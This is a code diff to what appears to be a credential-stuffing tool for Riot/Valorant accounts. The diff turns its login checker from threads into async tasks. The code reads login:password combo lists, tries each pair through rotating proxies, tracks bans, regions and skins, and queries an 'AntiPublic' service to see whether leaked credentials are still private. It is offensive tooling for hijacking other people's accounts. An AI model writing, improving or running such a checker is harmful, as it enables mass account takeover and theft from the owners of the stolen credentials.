@@ -31,12 +31,12 @@ class singlelinechecker():
                 message='wanna capture skins?', default=True, qmark=''
             ).execute()
 
-    def main(self) -> None:
+    async def main(self) -> None:
         useAP = not self.APtoken == ""
         if useAP:
             ap = antipublic.AntiPublic(self.APtoken, self.session)
             if not ap.test():
-                print("Your AntiPublic token is invalid or the server is down. Please ask the dev for a new one (on our discord server).")
+                print("Your AntiPublic token is invalid or the server is down. Please get a new one (on our discord server).")
                 useAP = False
         authenticate = auth.Auth(self.isDebug)
         while True:
@@ -49,7 +49,7 @@ class singlelinechecker():
                 break
             if not ':' in logpass:
                 continue
-            account = authenticate.auth(logpass)
+            account = await authenticate.auth(logpass)
             isPrivate = "N/A"
             if useAP:
                 isPrivate = ap.check(logpass)
@@ -224,7 +224,7 @@ class simplechecker():
                 account = account.strip()
                 us = account.split(':')[0]
                 ps = account.split(':')[1]
-                self.checker(us, ps)
+                await self.checker(us, ps)
         else:
             loop = asyncio.get_running_loop()
             tasks = []
@@ -237,10 +237,11 @@ class simplechecker():
                     try:
                         us = accounts[num].split(':')[0]
                         ps = accounts[num].split(':')[1]
-                        task = loop.run_in_executor(
-                            executor, self.checker, us, ps)
+                        task = loop.create_task(self.checker(us,ps))
+                        #task = loop.run_in_executor(
+                        #    executor, self.checker, us, ps)
                         tasks.append(task)
-                        # print(f'Added task for account {us}:{ps}. Current tasks: {len(tasks)}')
+                        #print(f'Added task for account {us}:{ps}. Current tasks: {len(tasks)}')
                         num += 1
                         vlchkr.checked = self.checked
                         vlchkr.valid = self.valid
@@ -258,7 +259,7 @@ class simplechecker():
                         vlchkr.regions = self.regions
                         vlchkr.savefile()
                     except:
-                        print("Checked all")
+                        pass
 
                 while len(tasks) > 0:
                     tasks = [task for task in tasks if not task.done()]
@@ -279,7 +280,7 @@ class simplechecker():
             #             except:
             #                 print("Checked all")
 
-    def checker(self, username, password):
+    async def checker(self, username, password):
         # print('running')
         riotlimitinarow = 0
         proxy = sys.getproxy(self.proxylist)
@@ -288,8 +289,10 @@ class simplechecker():
         authenticate = auth.Auth()
         while True:
             try:
-                account = authenticate.auth(
-                    acc, proxy=proxy)
+                account = await authenticate.auth(acc, proxy=proxy)
+                #input(account)
+                # account = await authenticate.auth(
+                #     acc, proxy=proxy)
                 if account.banuntil != None:
                     stff.checkban(account)
                 match account.code:
